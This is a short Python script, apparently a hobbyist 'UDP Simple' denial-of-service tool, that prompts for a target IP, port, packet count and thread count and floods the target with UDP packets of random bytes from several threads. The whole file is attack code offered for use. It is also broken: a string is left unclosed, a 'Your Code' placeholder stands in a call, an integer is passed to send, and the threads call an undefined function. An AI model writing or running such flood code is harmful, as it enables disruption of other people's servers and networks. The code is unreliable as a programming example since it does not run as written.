import random
import socket
import threading

print("""
--------> Version 5 | by Lexsh1n | Udp Simple.
target_server = str(input("[>] Ip Server :")) 
port_server = int(input("[>] Port Server :")) 
mengirim_request = int(input("[>] Pakets :")) 
mengirim_thread = int(input("[>]TimeOut :")) 

def attack():
    urandom_disini = random._urandom(Your Code) 
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_server,port_server))
            s.send(urandom_disini)
            for x in range(mengirim_request):
                s.send(mengirim_thread)
            print("D5os Attack To ip ", target_server, ", sent Port ", port_server)
        except:
            s.close()

for y in range(mengirim_thread):
    th = threading.Thread(target = server)
    th.start()
